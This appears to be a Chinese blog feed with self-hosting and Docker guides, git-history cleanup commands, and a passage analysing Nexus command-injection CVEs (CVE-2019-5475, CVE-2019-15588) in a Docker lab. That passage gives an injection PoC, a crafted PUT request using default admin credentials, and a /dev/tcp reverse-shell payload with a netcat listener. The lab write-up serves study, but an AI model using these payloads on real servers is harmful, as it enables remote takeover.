        <content type="html"><![CDATA[<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p>你是否面临以下困扰：</p><ul><li>想听以前某首音乐的时候，网上已经找不到了</li><li>即使网上找到了，因为版权原因无法在线听、甚至无法下载</li><li>可以在线听，但是要收费</li><li>在家、公司、手机都要专门为不同的音乐软件设置同一个曲库</li><li>……</li></ul><p>其实只需要使用 <a href="https://github.com/IrosTheBeggar/mStream">mStream</a> 搭建一个私人云音乐，这些问题就迎刃而解了：mStream 是采用 NodeJS 编写的，支持 mp3、flac 等多种格式的音乐流媒体服务器，它附带一个 RESTful JSON API 和内置的 Web GUI，可以在任何浏览器上访问您的云歌单。</p><p><img src="01.png"></p><h2 id="镜像仓库"><a href="#镜像仓库" class="headerlink" title="镜像仓库"></a>镜像仓库</h2><p>为方便起见，这里已经把相关镜像组件都封装到 Github 仓库 <a href="https://github.com/lyy289065406/seafile-docker">seafile-docker</a>。</p><h2 id="部署步骤"><a href="#部署步骤" class="headerlink" title="部署步骤"></a>部署步骤</h2><h3 id="1-项目构建"><a href="#1-项目构建" class="headerlink" title="1. 项目构建"></a>1. 项目构建</h3><ul><li>宿主机安装 docker、docker-compose</li><li>宿主机安全组/防火墙（iptables/firewall）放行 9000 端口的入口流量</li><li>下载仓库： <code>git clone https://github.com/lyy289065406/mstream-docker /usr/local/mstream-docker</code></li><li>打开仓库目录： <code>cd /usr/local/mstream-docker</code></li><li>构建镜像并运行： <code>./run.sh -u admin -p admin123</code></li><li>浏览器访问 <a href="http://127.0.0.1:9000/">http://127.0.0.1:9000</a> 即可使用</li></ul><blockquote><p>构建时设置的是 mStream 前端的登录账密</p></blockquote><h3 id="2-导入本地离线音乐"><a href="#2-导入本地离线音乐" class="headerlink" title="2. 导入本地离线音乐"></a>2. 导入本地离线音乐</h3><p>直接把音乐文件放到宿主机的 <a href="https://github.com/lyy289065406/mstream-docker/tree/master/music"><code>music</code></a> 目录，即可在前端的【File Explorer】找到这些音乐文件。</p><blockquote><p>因版权关系越来越多音乐难以下载，可以到 <a href="https://www.3esh-online.com/">https://www.3esh-online.com/</a> 搜索并免费下载音乐，下载后可把音乐文件存储到另一个 Repo（如 <a href="https://github.com/lyy289065406/music-library">music-library</a>），使用时再通过 git clone 拉取到 <a href="https://github.com/lyy289065406/mstream-docker/tree/master/music"><code>music</code></a> 目录</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mstream </tag>
            
            <tag> 云音乐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何清洗 Github 提交历史 ？</title>
      <link href="/tools/qing-xi-github-ti-jiao-li-shi/"/>
      <url>/tools/qing-xi-github-ti-jiao-li-shi/</url>
      
        <content type="html"><![CDATA[<p>当 Github 的 Repo 变得日益臃肿、或者上传了敏感内容时，常见的方法时清理相关文件的所有历史提交记录：</p><pre class="line-numbers language-shell"><code class="language-shell">git filter-branch --force --index-filter 'git rm --cached --ignore-unmatch ${FILEPATH}' --prune-empty --tag-name-filter cat -- --allgit push origin master --forcerm -rf .git/refs/original/git reflog expire --expire=now --allgit gc --prune=nowgit gc --aggressive --prune=now<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但若这类文件非常多的时候，一个可选的方法时直接清空所有历史记录：</p><pre class="line-numbers language-shell"><code class="language-shell">rm -rf .gitgit initgit add -Agit commit -m "clear history"git remote add origin ${GITHUB_REPO_URL}git push -f -u origin master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 开发/工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 seafile 搭建私人云盘</title>
      <link href="/website/seafile-da-jian-si-ren-yun-pan/"/>
      <url>/website/seafile-da-jian-si-ren-yun-pan/</url>
      
        <content type="html"><![CDATA[<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p>你是否面临以下困扰：</p><ul><li>免费云盘越来越少了</li><li>百度云盘限速越来越过分了</li><li>上传到云盘的文件被服务商泄露了、删掉了</li><li>不得已用 U 盘、QQ 给小伙伴共享文件</li><li>……</li></ul><p>其实只需要使用 <a href="https://github.com/haiwen/seafile">seafile</a> 搭建一个私人云盘，这些问题就迎刃而解了：Seafile 是一款开源的企业云盘，注重可靠性和性能，支持文件同步或者直接挂载到本地访问。</p><p><img src="01.png"></p><h2 id="镜像仓库"><a href="#镜像仓库" class="headerlink" title="镜像仓库"></a>镜像仓库</h2><p>为方便起见，这里已经把相关镜像组件都封装到 Github 仓库 <a href="https://github.com/lyy289065406/seafile-docker">seafile-docker</a>：</p><table><thead><tr><th align="center">镜像</th><th align="center">用途</th><th align="center">服务端口</th></tr></thead><tbody><tr><td align="center">seafile</td><td align="center">seafile 前端</td><td align="center">80</td></tr><tr><td align="center">mariadb</td><td align="center">seafile 数据库</td><td align="center">3306</td></tr><tr><td align="center">memcached</td><td align="center">seafile 缓存</td><td align="center">-</td></tr></tbody></table><h2 id="部署步骤"><a href="#部署步骤" class="headerlink" title="部署步骤"></a>部署步骤</h2><ul><li>宿主机安装 docker、docker-compose</li><li>宿主机安全组/防火墙（iptables/firewall）放行 80/443 端口的入口流量</li><li>下载仓库： <code>git clone https://github.com/lyy289065406/seafile-docker /usr/local/seafile-docker</code></li><li>打开仓库目录： <code>cd /usr/local/seafile-docker</code></li><li>构建镜像并运行： <code>./run.sh -u admin -p admin123</code></li><li>浏览器访问 <a href="http://127.0.0.1/">http://127.0.0.1:80</a> 即可使用</li></ul><blockquote><p>构建时设置的是 seafile 前端的登录账密，另 80 服务端口不可变更，否则文件无法下载</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seafile </tag>
            
            <tag> 云盘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSL2 迁移 Docker 镜像存储位置</title>
      <link href="/container/wsl2-qian-yi-docker-cun-chu-wei-zhi/"/>
      <url>/container/wsl2-qian-yi-docker-cun-chu-wei-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>自从 Win 10 推出 WSL2 之后，Docker Desktop 就默认使用 WSL2 运行了，此时通过 Hyper-V 无法再设置 Docker 镜像的存储位置，而且 Docker Desktop 的镜像位置设置项也不见了。</p><p>这就带来一个问题，由于 Docker 镜像默认是存储在 C 盘的 <code>%LOCALAPPDATA%/Docker/wsl</code> 目录，C 盘空间会越来越小，这对于 C 盘只作为系统盘的同学而言就十分不友好了，尤其是现在不少同学的 C 盘都是固态盘。</p><blockquote><p>WSL 是适用于 Linux 的 Windows 子系统可让开发人员按原样运行 GNU/Linux 环境，包括大多数命令行工具、实用工具和应用程序，且不会产生虚拟机开销。WSL2 作为新版本，它支持适用于 Linux 的 Windows 子系统在 Windows 上运行 ELF64 Linux 二进制文件，它的主要目标是提高文件系统性能，以及添加完全的系统调用兼容性。</p></blockquote><p>为了解决此问题，就需要想办法把 Docker 镜像迁移到其他盘符。</p><p>查看 Docker 官网说明，发现原来启用 WSL 后，Docker 运行数据都在 WSL 发行版中，因此镜像存储位置只能由 WSL 管理。</p><p>安装 Docker 后，Docker 会自动创建 2 个发行版：</p><ul><li>docker-desktop： 存储在 <code>%LOCALAPPDATA%\Docker\wsl\distro</code></li><li>docker-desktop-data： 存储在 <code>%LOCALAPPDATA%\Docker\wsl\data</code>（占用空间的元凶）</li></ul><p>在 WSL1 时代，几乎都是使用第三方工具 LxRunOffline 进行迁移，但是这个工具到了 WSL2 时代就不能用了：实践证明，LxRunOffline 确实可以迁移自己安装的发行版，却迁移不了 Docker 自动创建的 2 个发行版。</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>其实用 WSL 命令就可以简单实现迁移，操作步骤如下：</p><ol><li>停止 Docker 进程</li><li>关闭所有发行版： <code>wsl --shutdown</code></li><li>导出 docker-desktop-data 发行版： <code>wsl --export docker-desktop-data D:\wsl\docker\tmp\docker-desktop-data.tar</code></li><li>注销 docker-desktop-data 发行版： <code>wsl --unregister docker-desktop-data</code></li><li>导入 docker-desktop-data 到期望迁移的目录： <code>wsl --import docker-desktop-data D:\wsl\docker\data\ D:\wsl\docker\tmp\docker-desktop-data.tar --version 2</code> （迁移目录 <code>D:\wsl\docker\data\</code> 可根据个人需求修改）</li><li>（可选）删除第 3 步导出的临时文件： <code>D:\wsl\docker\tmp\docker-desktop-data.tar</code></li><li>（可选）另一个 Docker 发行版 docker-desktop 可使用同样方式迁移，但是其占用空间很小，不迁移亦可</li></ol><blockquote><p>迁移完成后可发现 <code>%LOCALAPPDATA%/Docker/wsl</code> 目录下的发行版文件已被删除， C 盘空间已释放</p></blockquote><h2 id="PowerShell-一键迁移脚本"><a href="#PowerShell-一键迁移脚本" class="headerlink" title="PowerShell 一键迁移脚本"></a>PowerShell 一键迁移脚本</h2><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># wsl2_move_docker_image.ps1</span><span class="token comment" spellcheck="true"># Docker 镜像存储位置一键迁移脚本（适用于 WSL2 版本）</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># Powershell Script 3.0+</span><span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------------------</span><span class="token comment" spellcheck="true"># 脚本使用方式（需使用管理员权限执行）:</span><span class="token comment" spellcheck="true">#   .\wsl2_move_docker_image.ps1 -target "D:\wsl\docker"</span><span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------------------</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># target: 期望迁移的目录</span><span class="token keyword">param</span><span class="token punctuation">(</span><span class="token namespace">[int]</span><span class="token variable">$target</span>=<span class="token string">"D:\wsl\docker"</span><span class="token punctuation">)</span><span class="token function">Write-Host</span> <span class="token string">"Stop docker ..."</span>net stop <span class="token string">"com.docker.service"</span><span class="token function">Write-Host</span> <span class="token string">"Stop wsl ..."</span>wsl <span class="token operator">--</span>shutdown<span class="token function">Write-Host</span> <span class="token string">"Move docker-desktop-data image ..."</span>wsl <span class="token operator">--</span>export docker<span class="token operator">-</span>desktop<span class="token operator">-</span><span class="token keyword">data</span> <span class="token variable">$target</span>\tmp\docker<span class="token operator">-</span>desktop<span class="token operator">-</span><span class="token keyword">data</span><span class="token punctuation">.</span>tarwsl <span class="token operator">--</span>unregister docker<span class="token operator">-</span>desktop<span class="token operator">-</span><span class="token keyword">data</span>wsl <span class="token operator">--</span>import docker<span class="token operator">-</span>desktop<span class="token operator">-</span><span class="token keyword">data</span> <span class="token variable">$target</span>\<span class="token keyword">data</span>\ <span class="token variable">$target</span>\tmp\docker<span class="token operator">-</span>desktop<span class="token operator">-</span><span class="token keyword">data</span><span class="token punctuation">.</span>tar <span class="token operator">--</span>version 2<span class="token function">Remove-Item</span> <span class="token variable">$target</span>\tmp\docker<span class="token operator">-</span>desktop<span class="token operator">-</span><span class="token keyword">data</span><span class="token punctuation">.</span>tar <span class="token operator">-</span>recurse<span class="token function">Write-Host</span> <span class="token string">"Move docker-desktop image ..."</span>wsl <span class="token operator">--</span>export docker<span class="token operator">-</span>desktop <span class="token variable">$target</span>\tmp\docker<span class="token operator">-</span>desktop<span class="token punctuation">.</span>tarwsl <span class="token operator">--</span>unregister docker<span class="token operator">-</span>desktopwsl <span class="token operator">--</span>import docker<span class="token operator">-</span>desktop <span class="token variable">$target</span>\distro\ <span class="token variable">$target</span>\tmp\docker<span class="token operator">-</span>desktop<span class="token punctuation">.</span>tar <span class="token operator">--</span>version 2<span class="token function">Remove-Item</span> <span class="token variable">$target</span>\tmp\docker<span class="token operator">-</span>desktop<span class="token punctuation">.</span>tar <span class="token operator">-</span>recurse<span class="token function">Write-Host</span> <span class="token string">"Finish."</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 容器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> 容器 </tag>
            
            <tag> WSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-5475 与 CVE-2019-15588 漏洞分析</title>
      <link href="/safe/cve-2019-5475-lou-dong-fen-xi/"/>
      <url>/safe/cve-2019-5475-lou-dong-fen-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="0x10-漏洞背景"><a href="#0x10-漏洞背景" class="headerlink" title="0x10 漏洞背景"></a>0x10 漏洞背景</h2><p>Nexus 的全称是 Nexus Repository Manager，是 Sonatype 公司推出的一个强大的仓库管理器，它极大地简化了内部仓库的维护和外部仓库的访问。</p><p>以往主要用之搭建 maven 私有仓库，但是随着社区更新不断迭代，它的功能不再局限于 maven，更是进一步覆盖了 nuget、docker、npm、bower、pypi、rubygems、git lfs、yum、go、apt 等私有仓库的搭建。</p><p>这次的 CVE-2019-5475 是 Nexus 关于内置插件 Yum Repository 的 RCE 命令注入漏洞，其最早被披露于 <a href="https://hackerone.com/reports/654888">hackerone</a>，但因官方第一次修复不完整，故又衍生出了 CVE-2019-15588 漏洞。</p><p>这两个漏洞都需要以 admin 身份登录后才可以利用，但是 nexus 默认管理员密码 admin123 经常被忽略修改，很容易就被利用了。</p><h2 id="0x20-漏洞靶场"><a href="#0x20-漏洞靶场" class="headerlink" title="0x20 漏洞靶场"></a>0x20 漏洞靶场</h2><ul><li>靶场源码： <a href="https://github.com/lyy289065406/CVE-2019-5475">https://github.com/lyy289065406/CVE-2019-5475</a></li><li>环境说明：<ul><li>Docker: <code>latest</code></li><li>Nexus: <code>2.14.9</code> 与 <code>2.14.15</code></li></ul></li><li>靶场结构：</li></ul><pre><code>CVE-2019-5475├── nexus-yum-core .......... [用于 debug 的 Maven 项目：模拟在 nexus GUI 输入 createrepo 或 mergerepo]├── nexus ................... [Nexus 容器的数据挂载目录]├── attacker ................ [攻击者机器的构建目录]│   └── Dockerfile .......... [攻击者机器的 Docker 构建文件]├── docker-compose.yml ...... [Docker 的构建配置]├── imgs .................... [辅助 README 说明的图片]└── README.md ............... [此 README 说明]</code></pre><h2 id="0x30-靶场搭建"><a href="#0x30-靶场搭建" class="headerlink" title="0x30 靶场搭建"></a>0x30 靶场搭建</h2><ul><li>宿主机预装 docker 和 docker-compose</li><li>下载仓库： <a href="https://github.com/lyy289065406/CVE-2019-5475">git clone https://github.com/lyy289065406/CVE-2019-5475</a></li><li>打开 Nexus 构建目录： <code>cd CVE-2019-5475</code></li><li>构建并运行 Nexus： <code>docker-compose up -d</code></li><li>约 5 分钟后可从浏览器访问 Nexus （BasicAuth 为 <code>admin/admin123</code>），其中：</li></ul><table><thead><tr><th align="center">Nexus</th><th align="center">CVE</th><th align="left">URL</th></tr></thead><tbody><tr><td align="center">2.14.9</td><td align="center">CVE-2019-5475</td><td align="left"><a href="http://127.0.0.1:8009/nexus">http://127.0.0.1:8009/nexus</a></td></tr><tr><td align="center">2.14.15</td><td align="center">CVE-2019-15588</td><td align="left"><a href="http://127.0.0.1:8015/nexus">http://127.0.0.1:8015/nexus</a></td></tr></tbody></table><blockquote><p>此靶场还搭建了一台攻击机 172.168.50.2，处于与两台靶机相同的网络环境，其作用是用于验证反弹 shell</p></blockquote><h2 id="0x40-靶场验证"><a href="#0x40-靶场验证" class="headerlink" title="0x40 靶场验证"></a>0x40 靶场验证</h2><h3 id="0x41-CVE-2019-5475"><a href="#0x41-CVE-2019-5475" class="headerlink" title="0x41 CVE-2019-5475"></a>0x41 CVE-2019-5475</h3><p>使用 admin 登录 <a href="http://127.0.0.1:8009/nexus/#capabilities">http://127.0.0.1:8009/nexus/#capabilities</a>，在 <code>Administration -&gt; Capabilities -&gt; Yum: Configuration -&gt; Settings</code> 可以找到 RCE 注入点。</p><p>输入框 <code>Path of "createrepo"</code> 和 <code>Path of "mergerepo"</code> 均可被注入，执行结果可以从 <code>Status</code> 查看。</p><p>例如在 <code>createrepo</code> 注入点构造 PoC <code>bash -c id || python</code>，即可从 <code>Status</code> 得到命令 <code>bash -c id</code> 的执行结果 <code>uid=200(nexus) gid=200(nexus) groups=200(nexus)</code> 。</p><p>通过 BurpSuite 可截获到对应 PoC 请求为：</p><pre><code>PUT /nexus/service/siesta/capabilities/RANDOM_ID HTTP/1.1Host: 127.0.0.1:8009accept: application/jsonContent-Type: application/jsonAuthorization: Basic YWRtaW46YWRtaW4xMjM=Connection: close{"typeId":"yum","enabled":true,"properties":[{"key":"createrepoPath","value":"bash -c id || python"}],"id":"RANDOM_ID"}</code></pre><p><img src="./01.png"></p><p><img src="./02.png"></p><h3 id="0x42-CVE-2019-15588"><a href="#0x42-CVE-2019-15588" class="headerlink" title="0x42 CVE-2019-15588"></a>0x42 CVE-2019-15588</h3><p>注入位置与 CVE-2019-5475 相同，调整 PoC 为： <code>/bin/bash -c id || /createrepo</code></p><h2 id="0x50-漏洞分析"><a href="#0x50-漏洞分析" class="headerlink" title="0x50 漏洞分析"></a>0x50 漏洞分析</h2><p>通过阅读官方补丁的代码改动位置，可以大概分析到漏洞成因。</p><p>从官方第一次针对 CVE-2019-5475 发布的<a href="https://github.com/sonatype/nexus-public/commit/e8769e53f6bb601126ef5d21f9ea009873b65e25#diff-4ab0523de106ac7a38808f0231fc8a23R81">修复补丁</a>可知关键代码类有两个：</p><ul><li><a href="https://github.com/sonatype/nexus-public/blob/release-2.14.9-01/plugins/yum/nexus-yum-repository-plugin/src/main/java/org/sonatype/nexus/yum/internal/capabilities/YumCapability.java#L82"><code>YumCapability.java</code></a></li></ul><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">YumCapability</span> <span class="token keyword">extends</span> <span class="token class-name">CapabilitySupport</span><span class="token operator">&lt;</span>YumCapabilityConfiguration<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> Condition <span class="token function">activationCondition</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">conditions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">capabilities</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">evaluable</span><span class="token punctuation">(</span>            <span class="token keyword">new</span> <span class="token class-name">Evaluable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token annotation punctuation">@Override</span>                <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isSatisfied</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                    <span class="token function">validate</span><span class="token punctuation">(</span><span class="token string">"createrepo"</span><span class="token punctuation">,</span> <span class="token function">getConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getCreaterepoPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"[0.9.9,)"</span><span class="token punctuation">,</span> message<span class="token punctuation">,</span> verificationLog<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">validate</span><span class="token punctuation">(</span><span class="token string">"mergerepo"</span><span class="token punctuation">,</span> <span class="token function">getConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMergerepoPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"[0.1,)"</span><span class="token punctuation">,</span> message<span class="token punctuation">,</span> verificationLog<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                <span class="token punctuation">}</span>                <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">validate</span><span class="token punctuation">(</span><span class="token keyword">final</span> String type<span class="token punctuation">,</span> <span class="token keyword">final</span> String path<span class="token punctuation">,</span>                                      <span class="token keyword">final</span> String versionConstraint<span class="token punctuation">,</span>                                      <span class="token keyword">final</span> StringBuilder message<span class="token punctuation">,</span> <span class="token keyword">final</span> StringBuilder verificationLog<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                    ByteArrayOutputStream baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">try</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>commandLineExecutor<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>path <span class="token operator">+</span> <span class="token string">" --version"</span><span class="token punctuation">,</span> baos<span class="token punctuation">,</span> baos<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><a href="https://github.com/sonatype/nexus-public/blob/release-2.14.9-01/plugins/yum/nexus-yum-repository-plugin/src/main/java/org/sonatype/nexus/yum/internal/task/CommandLineExecutor.java#L59"><code>CommandLineExecutor.java</code></a></li></ul><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommandLineExecutor</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">final</span> String command<span class="token punctuation">,</span> OutputStream out<span class="token punctuation">,</span> OutputStream err<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        CommandLine cmdLine <span class="token operator">=</span> CommandLine<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>        DefaultExecutor executor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultExecutor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        executor<span class="token punctuation">.</span><span class="token function">setStreamHandler</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PumpStreamHandler</span><span class="token punctuation">(</span>out<span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> exitValue <span class="token operator">=</span> executor<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span>cmdLine<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> exitValue<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不难解读其数据处理逻辑如下：</p><ul><li>在前端 GUI 输入框 <code>Path of "createrepo"</code> 输入的值会存储到 <code>getConfig().getCreaterepoPath()</code></li><li>令 <code>path = getConfig().getCreaterepoPath()</code></li><li><code>path</code> 值会在 <code>YumCapability.activationCondition()</code> 内通过 <code>validate()</code> 进行校验</li><li>其校验方法为在 <code>path</code> 末尾拼接字符串 <code> --version</code>，然后通过 <code>CommandLineExecutor.exec()</code> 执行</li><li><code>CommandLineExecutor.exec()</code> 就是对系统命令调用的封装</li></ul><p>显然这里存在命令注入漏洞，当我们在前端输入 <code>${INPUT}</code> 时，会在系统执行命令 <code>${INPUT} --version</code>。</p><p>因此我们在靶场输入 <code>bash -c id || python</code> 时，相当于在系统执行命令 <code>bash -c id || python --version</code>。</p><blockquote><p><code>bash -c</code> 目的是使用 bash 环境执行命令，有兴趣可以看下<a href="https://www.jianshu.com/p/198d819d24d1">这篇文章</a>关于 <code>bash -c cmd_string</code> 的解释</p></blockquote><h2 id="0x60-漏洞利用"><a href="#0x60-漏洞利用" class="headerlink" title="0x60 漏洞利用"></a>0x60 漏洞利用</h2><p>接下来似乎就很好办了，参考我的这篇文章《<a href="../ge-chong-yu-yan-yi-ju-hua-fan-dan-shell/">各种语言一句话反弹shell</a>》，不就可以很轻易地注入一个反弹 shell 么 ：<code>bash -i &gt;&amp;/dev/tcp/${IP}/${PORT} 0&gt;&amp;1</code> ？</p><ul><li>登录靶场攻击机 172.168.50.2 ： <code>docker exec -it -u root docker_attacker /bin/bash</code></li><li>利用 netcat 监听反弹： <code>nc -lvvp 4444</code></li><li>在 <code>Path of "createrepo"</code> 输入框构造 payload：<code>bash -c bash -i &gt;&amp;/dev/tcp/172.168.50.2/4444 0&gt;&amp;1 || python</code></li></ul><p>事实上这个 payload 并不能利用成功。</p><p><img src="./04.png"></p><p>为了探究原因，这里需要进一步解读 Nexus 的源码（我把核心代码抽离到了 Maven 项目 <a href="https://github.com/lyy289065406/CVE-2019-5475/tree/master/nexus-yum-core"><code>nexus-yum-core</code></a>，有兴趣可以用这个项目 DEBUG）。</p><p>Nexus 自己封装了一个系统命令执行类 <a href="https://github.com/sonatype/nexus-public/blob/release-2.14.9-01/plugins/yum/nexus-yum-repository-plugin/src/main/java/org/sonatype/nexus/yum/internal/task/CommandLineExecutor.java#L59"><code>CommandLineExecutor.java</code></a>，这个类是对 apache 构件 commons-exec-x.y.jar 的简单封装。它调用了该构件的 <a href="https://github.com/apache/commons-exec/blob/0ee055d21c080f9303c13aa2a018a0748ff0d1fd/src/main/java/org/apache/commons/exec/CommandLine.java#L84"><code>CommandLine.parse(command)</code></a> 方法，该方法使用 <a href="https://github.com/apache/commons-exec/blob/0ee055d21c080f9303c13aa2a018a0748ff0d1fd/src/main/java/org/apache/commons/exec/CommandLine.java#L336"><code>translateCommandline()</code></a> 对输入的命令进行了拆解：</p><ul><li>按 <code>"</code>（双引号）、<code>'</code>（单引号）、<code> </code>（空格） 字符对命令字符串进行分割</li><li>对于在 <code>"</code>（双引号） 或 <code>'</code>（单引号） 内的子串则认为是一个整体（即使引号内有空格），并先删除其原本的引号，再强制在子串两端追加双引号</li></ul><p>例如：</p><table><thead><tr><th align="left">输入</th><th align="left">输出</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left"><code>bash -c echo 111</code></td><td align="left">String[] { <code>bash</code>、<code>-c</code>、<code>echo</code>、<code>111</code> }</td><td align="left">-</td></tr><tr><td align="left"><code>bash -c 'echo 111'</code></td><td align="left">String[] { <code>bash</code>、<code>-c</code>、<code>"echo 111"</code> }</td><td align="left">注意 <code>"echo 111"</code> 的双引号并不是用来表示字符串的，<br>而是这个字符串两端真的有双引号 